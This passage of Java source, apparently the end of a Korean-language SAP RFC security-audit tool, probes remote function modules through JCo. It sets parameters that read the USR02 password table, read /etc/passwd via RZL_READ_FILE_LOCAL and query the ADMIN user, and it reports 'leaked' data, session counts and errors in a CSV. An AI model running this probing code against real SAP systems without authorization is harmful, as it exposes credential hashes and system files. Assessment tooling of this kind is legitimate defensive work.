    private static void injectPayload(JCoFunction func, String rfcName) {
        try {
            if (rfcName.contains("READ_TABLE")) {
                func.getImportParameterList().setValue("QUERY_TABLE", "USR02");
                func.getImportParameterList().setValue("ROWCOUNT", 1);
            } else if (rfcName.equals("RZL_READ_FILE_LOCAL")) {
                func.getImportParameterList().setValue("NAME", "/etc/passwd");
            } else if (rfcName.equals("BAPI_USER_GET_DETAIL") || rfcName.equals("TH_USER_INFO")) {
                func.getImportParameterList().setValue("USERNAME", "ADMIN");
            }
        } catch (Exception ignore) {}
    }

    private static String collectEvidence(JCoFunction func, String rfcName) {
        try {
            if (rfcName.contains("READ_TABLE")) {
                JCoTable data = func.getTableParameterList().getTable("DATA");
                return data.getNumRows() > 0 ? "DB Data Leak: " + data.getString("WA").substring(0, Math.min(30, data.getString("WA").length())) : "Table Accessible";
            } else if (rfcName.equals("TH_USER_LIST")) {
                return "Active Session Count: " + func.getTableParameterList().getTable("USRLIST").getNumRows();
            } else if (rfcName.equals("RFC_SYSTEM_INFO")) {
                return "SID: " + func.getExportParameterList().getString("RFCSI_SID");
            }
            return "Function Execution Allowed";
        } catch (Exception e) { return "Execution Confirmed (Data Hidden)"; }
    }

    private static String analyzeError(JCoException e) {
        if (e.getGroup() == 104) return "DENIED(S_RFC)";
        if (e.getMessage().contains("required") || e.getMessage().contains("empty") || e.getMessage().contains("NOT_FOUND")) 
            return "★ POTENTIAL(권한열림) ★";
        return "ERROR: " + e.getGroup();
    }

    private static void printFinalSummary(int total, int success) {
        System.out.println("\n==================================================================");
        System.out.println("  [진단 결과 요약]");
        System.out.println("  - 총 점검 항목 : " + total + " 개");
        System.out.println("  - 탈취 성공(CRITICAL) : " + success + " 개");
        System.out.println("  - 보안 상태 : " + (success > 0 ? "취약 (조치 필요)" : "확인 필요"));
        System.out.println("==================================================================");
    }

    private static void writeCsv(String fileName, List<String[]> rows) throws IOException {
        try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(fileName), "UTF-8"))) {
            for (String[] row : rows) {
                bw.write(String.join(",", Arrays.stream(row).map(s -> "\"" + (s == null ? "" : s.replace("\"", "\"\"")) + "\"").toArray(String[]::new)));
                bw.newLine();
            }
        }
        System.out.println("[+] 리포트 저장 완료: " + fileName);
    }

    private static void createDestinationFile(String name, Properties props) throws Exception {
        File destFile = new File(name + ".jcoDestination");
        try (FileOutputStream fos = new FileOutputStream(destFile)) {
            props.store(fos, "Mega Audit Config");
        }
    }
}
